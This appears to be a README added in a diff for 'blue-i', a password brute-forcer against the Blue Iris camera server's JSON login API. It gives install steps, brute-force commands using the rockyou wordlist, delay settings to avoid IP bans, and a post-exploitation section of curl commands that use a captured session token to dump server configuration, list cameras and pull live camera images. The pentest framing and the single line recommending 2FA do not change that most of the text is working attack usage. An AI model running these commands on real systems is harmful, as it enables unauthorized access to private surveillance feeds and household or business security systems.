@@ -1,0 +1,91 @@
+blue-i Tool Instructions
+========================
+
+1. What is blue-i?
+------------------
+blue-i is a modern, purpose-built Blue Iris JSON scanner and brute-forcer.
+It speaks the native Blue Iris /json API (cmd=login) instead of generic web forms.
+This makes it far more reliable than Hydra on Blue Iris 5.x and 6.x (especially when "Use secure session keys" is enabled).
+
+Key advantages:
+- Correct MD5 challenge-response (username:session:password)
+- Native support for rockyou.txt.gz (no need to gunzip)
+- Built-in delay to avoid IP bans
+- Returns a usable session token on success
+- Installs as a real Kali CLI command (`blue-i`)
+
+2. Installation (one-time)
+--------------------------
+cd ~/blueiris-scanner
+python3 -m venv venv
+source venv/bin/activate
+pip install -e .
+
+After this you can run `blue-i` from ANY directory on your Kali box.
+
+3. Basic Usage
+--------------
+blue-i --help                    # Full help screen
+
+# Quick anonymous access check
+blue-i -H http://REDACTED:81
+
+# Brute-force with rockyou (recommended for most pentests)
+blue-i -H http://REDACTED:81 -p /usr/share/wordlists/rockyou.txt.gz -v --delay 1
+
+# Try username as password for every user
+blue-i -H http://REDACTED:81 -u users.txt --try-user-as-pass -v --delay 1
+
+# Dynamic combo list (username:password pairs)
+blue-i -H http://REDACTED:81 -c combos.txt -v --delay 1
+
+4. Full Options
+---------------
+-H, --host          Target URL (required)
+-u, --users         Username list (default: users.txt)
+-p, --passwords     Password list (supports .txt or .gz)
+-c, --combo         Combo file (one "user:pass" per line)
+--try-user-as-pass  Try each username as its own password
+-d, --delay         Seconds between attempts (default: 2)
+-v, --verbose       Show every attempt
+
+5. What You See When It Succeeds
+--------------------------------
+[+] SUCCESS - admin:SuperSecretPass123
+    Session token: 8f3a9b2c7d1e4f6a9b2c7d1e4f6a9b2c
+    Use this token for any JSON command (cameras, alerts, config, etc.)
+
+[+] Example: curl -X POST http://REDACTED:81/json -d '{"cmd":"system","session":"8f3a9b2c7d1e4f6a9b2c7d1e4f6a9b2c"}'
+
+→ Copy the session token immediately.
+
+6. Post-Exploitation (after successful login)
+---------------------------------------------
+Replace TOKEN with the session token you received.
+
+# System information (version, CPU, RAM, uptime, etc.)
+curl -X POST http://REDACTED:81/json -d '{"cmd":"system","session":"TOKEN"}'
+
+# List all cameras + live URLs
+curl -X POST http://REDACTED:81/json -d '{"cmd":"cameras","session":"TOKEN"}'
+
+# Get current alerts / motion events
+curl -X POST http://REDACTED:81/json -d '{"cmd":"alerts","session":"TOKEN"}'
+
+# Full server configuration dump
+curl -X POST http://REDACTED:81/json -d '{"cmd":"config","session":"TOKEN"}'
+
+# Current profiles (day/night/schedule)
+curl -X POST http://REDACTED:81/json -d '{"cmd":"profiles","session":"TOKEN"}'
+
+# Export a specific camera's live JPEG (replace cam1 with camera ID)
+curl -X POST http://REDACTED:81/json -d '{"cmd":"cam","session":"TOKEN","id":"cam1","quality":100}' --output live.jpg
+
+7. OPSEC / Pentest Tips
+-----------------------
+- Always use --delay 1 or higher on production systems
+- Blue Iris bans IPs aggressively on rapid failures
+- Document creds + timestamp + session token in your report
+- Recommend client enable 2FA, IP whitelisting, and disable anonymous access
+
+Made for offensive security use.
